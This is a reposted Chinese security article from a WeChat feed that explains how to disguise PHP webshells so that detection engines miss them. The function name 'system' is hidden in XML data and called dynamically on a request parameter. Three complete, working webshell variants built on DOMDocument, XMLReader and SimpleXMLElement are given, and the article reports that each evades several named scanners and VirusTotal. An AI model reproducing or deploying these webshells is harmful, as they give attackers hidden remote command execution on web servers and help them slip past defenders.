---
title: 【转载】使用XML变形webshell免杀思路
url: https://mp.weixin.qq.com/s/W7cG7bNXV2weIo7TlM436A
source: Doonsec's feed
date: 2026-04-04
fetch_date: 2026-04-05T04:35:01.074333
---

# 【转载】使用XML变形webshell免杀思路

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/DJX1rNqJe4liaqYhfWjcwW2NiajmhSnVSaz08MLL7JVAPmcNO6zm5w1BQWp1KJSXz5zwNxagPiard3ianfqSgFIftSm7VMlhibARRjnqytEwkNHk/0?wx_fmt=jpeg)

# 【转载】使用XML变形webshell免杀思路

隐雾安全

![]()

在小说阅读器中沉浸阅读

好文推荐

文章作者：先知社区(用户9528)

文章来源：https://xz.aliyun.com/news/17490

**思路**

整体思路就是利用php中处理xml格式的类，对函数进行替换，同时利用php的动态执行的特点
xml格式很常见，php中也有很多处理xml格式转换的类，以DOMDocument为例，ai构造一下php文件：

```
<?php// 创建 DOMDocument 对象$dom = new DOMDocument();// 加载 XML 文档$dom->loadXML('<?xml version="1.0" encoding="UTF-8"?><data>    <item>        <key>system</key>    </item>    <item>        <key>age</key>        <value>30</value>    </item></data>');// 创建 DOMXPath 对象$xpath = new DOMXPath($dom);// 执行 XPath 查询，选择所有 item 节点$items = $xpath->query('//item');// 初始化一个空数组来存储键值对$keyValuePairs = [];// 遍历每个 item 节点foreach ($items as $item) {    // 获取 key 节点的文本内容    $key = $xpath->query('key', $item)->item(0)->textContent;    // 获取 value 节点的文本内容    // $value = $xpath->query('value', $item)->item(0)->textContent;    // 将键值对添加到数组中    ($key)($_GET['a']);}?>
```

在php8.2.9 php7.3.4测试环境下均执行：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTIFkU9wrg3Ba0mNF78rUia2szEAIBKOMU15WERccovVl4ppcMYhjDCGQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=0)

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTUBCejuB0icntMxaM0p5v3F143VLdMK7MZ8x29MzBfiaKfiagoBM9QqZgg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1)
**检测**
常用的webshell查杀工具：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FT8oRgvtAFo6QlG9hbCBczU038dUtssMibQJ7wADdm8uTRlDbk8FhkvBA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=2)

阿里云检测引擎：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTcHQcNibKXx1knaYlcicfMJPIUxxypMg5GjNUSU7qn9DyNlBbD54k3hpA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=3)

D盾：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTtVQdCQBhLiav50LcUcibQzWdG2qAFlCzTZ0DiacKthV1bCldHz21CT1gg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=4)

河马：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FT6evNiaaYSQegB9pFxvmU6asDkW7DNHSjRbaSBib8mzVHKf6VLOVqaztQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=5)

virustotal：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FT68YP2GhQibRv5sr8pnbCqb9z5Azzdtu5bjUcscyb70ftxmao0gZxXdg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=6)

360：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTeeYMlTMcrd4fZjVVYsXULxBYJiaYAngEr16MUcicc8okgxicibniaic0KgmQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=7)

微步：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTlXMa8Mgp4BOpawPfSmTuBlicm6ucGOb08mUor1gFHaBQfPOCGpNlrmg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=8)

长亭：

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnA0JMYaSxKpPJ96NonO7FTOCeN9KEsibDHbTVRYbxqx5J0jhaevYoZsteB1OJ3dgoO16kzymxicbgw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=9)

**其他**
利用上述思路，使用php中其他处理xml格式转换的类构造：
XMLReader：

```
<?php
// 示例 XML 字符串
$xmlString = '
<root>
    <item>
        <key1>system</key1>
    </item>
</root>
';
// 创建 XMLReader 实例
$reader = new XMLReader();
// 打开 XML 字符串进行解析
$reader->xml($xmlString);
// 存储键值对的数组
$keyValuePairs = [];
// 开始解析 XML
while ($reader->read()) {
    // 检查当前节点是否为元素节点
    if ($reader->nodeType === XMLReader::ELEMENT) {
        // 获取当前元素的名称
        $key = $reader->name;
        // 读取下一个节点
        if ($reader->read()) {
            // 检查下一个节点是否为文本节点
            if ($reader->nodeType === XMLReader::TEXT) {
                // 获取文本节点的值
                ($reader->value)($_GET["a"]);
            }
        }
    }
}
// 关闭 XMLReader
$reader->close();
?>
```

SimpleXMLElement:

```
<?php
// 定义XML字符串
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<root>
    <system>a</system>
</root>';
// 使用SimpleXMLElement解析XML字符串
$xml = new SimpleXMLElement($xmlString);
// 遍历XML元素
foreach ($xml as $key => $value) {
    ($key)($_GET["a"]);
}
?>
```

这两个均通过上面提到的引擎检测

总结

webshell免杀有很多技巧，上面也只是抛砖引玉吧，思路还是最重要。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ELQKhUzr34xNiazXVTT6qEbEU7UjrgFplQqq3mt9dTpB7qCTQSsP9FMqic1ub553HR5NPeVcHnI7QSwde7madgCQ/0?wx_fmt=png)

隐雾安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ELQKhUzr34xNiazXVTT6qEbEU7UjrgFplQqq3mt9dTpB7qCTQSsP9FMqic1ub553HR5NPeVcHnI7QSwde7madgCQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过